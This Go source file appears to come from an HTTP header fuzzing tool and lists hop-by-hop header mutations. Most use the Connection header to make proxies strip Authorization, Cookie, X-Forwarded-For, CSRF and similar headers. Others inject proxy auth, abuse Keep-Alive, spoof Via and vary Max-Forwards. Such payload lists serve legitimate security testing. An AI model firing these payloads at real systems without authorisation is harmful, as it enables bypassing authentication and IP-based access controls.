package headers

import "github.com/cc1a2b/hhunter/engine"

func GetHopByHopMutations() []engine.Mutation {
	return []engine.Mutation{
		// Connection header abuse to strip security headers
		{Header: "Connection", Value: "X-Forwarded-For", Category: "HopByHop", Impact: "Strip X-Forwarded-For via Hop-by-Hop"},
		{Header: "Connection", Value: "X-Real-IP", Category: "HopByHop", Impact: "Strip X-Real-IP via Hop-by-Hop"},
		{Header: "Connection", Value: "X-Forwarded-Host", Category: "HopByHop", Impact: "Strip X-Forwarded-Host via Hop-by-Hop"},
		{Header: "Connection", Value: "Authorization", Category: "HopByHop", Impact: "Strip Authorization via Hop-by-Hop"},
		{Header: "Connection", Value: "Cookie", Category: "HopByHop", Impact: "Strip Cookie via Hop-by-Hop"},
		{Header: "Connection", Value: "X-API-Key", Category: "HopByHop", Impact: "Strip API Key via Hop-by-Hop"},
		{Header: "Connection", Value: "X-Auth-Token", Category: "HopByHop", Impact: "Strip Auth Token via Hop-by-Hop"},
		{Header: "Connection", Value: "X-CSRF-Token", Category: "HopByHop", Impact: "Strip CSRF Token via Hop-by-Hop"},
		{Header: "Connection", Value: "X-Request-ID", Category: "HopByHop", Impact: "Strip Request-ID via Hop-by-Hop"},
		{Header: "Connection", Value: "X-Correlation-ID", Category: "HopByHop", Impact: "Strip Correlation-ID via Hop-by-Hop"},
		{Header: "Connection", Value: "Content-Length", Category: "HopByHop", Impact: "Strip Content-Length via Hop-by-Hop"},
		{Header: "Connection", Value: "Content-Type", Category: "HopByHop", Impact: "Strip Content-Type via Hop-by-Hop"},
		{Header: "Connection", Value: "Accept-Encoding", Category: "HopByHop", Impact: "Strip Accept-Encoding via Hop-by-Hop"},
		{Header: "Connection", Value: "Host", Category: "HopByHop", Impact: "Strip Host via Hop-by-Hop"},
		{Header: "Connection", Value: "X-Forwarded-Proto", Category: "HopByHop", Impact: "Strip X-Forwarded-Proto via Hop-by-Hop"},
		{Header: "Connection", Value: "Set-Cookie", Category: "HopByHop", Impact: "Strip Set-Cookie via Hop-by-Hop"},
		{Header: "Connection", Value: "X-Frame-Options", Category: "HopByHop", Impact: "Strip X-Frame-Options via Hop-by-Hop"},

		// Multiple headers via Connection
		{Header: "Connection", Value: "keep-alive, X-Forwarded-For, X-Real-IP", Category: "HopByHop", Impact: "Multi-Header Stripping"},
		{Header: "Connection", Value: "close, Authorization, Cookie", Category: "HopByHop", Impact: "Auth Header Stripping Chain"},
		{Header: "Connection", Value: "keep-alive, X-Forwarded-For, Authorization", Category: "HopByHop", Impact: "IP + Auth Stripping"},

		// Proxy-related hop-by-hop
		{Header: "Proxy-Connection", Value: "keep-alive", Category: "HopByHop", Impact: "Proxy Connection Persistence"},
		{Header: "Proxy-Authorization", Value: "Basic dGVzdDp0ZXN0", Category: "HopByHop", Impact: "Proxy Auth Injection"},
		{Header: "Proxy-Authenticate", Value: "Basic", Category: "HopByHop", Impact: "Proxy Auth Challenge"},

		// Keep-Alive abuse
		{Header: "Keep-Alive", Value: "timeout=99999, max=99999", Category: "HopByHop", Impact: "Keep-Alive Connection Abuse"},
		{Header: "Keep-Alive", Value: "timeout=0", Category: "HopByHop", Impact: "Keep-Alive Immediate Close"},

		// Via header manipulation
		{Header: "Via", Value: "1.1 internal-proxy", Category: "HopByHop", Impact: "Via Header Internal Proxy"},
		{Header: "Via", Value: "1.0 fred, 1.1 p.example.net", Category: "HopByHop", Impact: "Via Header Chain Injection"},
		{Header: "Via", Value: "HTTP/1.1 GWA", Category: "HopByHop", Impact: "Via Header Gateway"},

		// Max-Forwards (TRACE/OPTIONS)
		{Header: "Max-Forwards", Value: "0", Category: "HopByHop", Impact: "Max-Forwards Zero (Proxy Stop)"},
		{Header: "Max-Forwards", Value: "1", Category: "HopByHop", Impact: "Max-Forwards One (Next Hop Only)"},
		{Header: "Max-Forwards", Value: "255", Category: "HopByHop", Impact: "Max-Forwards Maximum Hops"},
	}
}
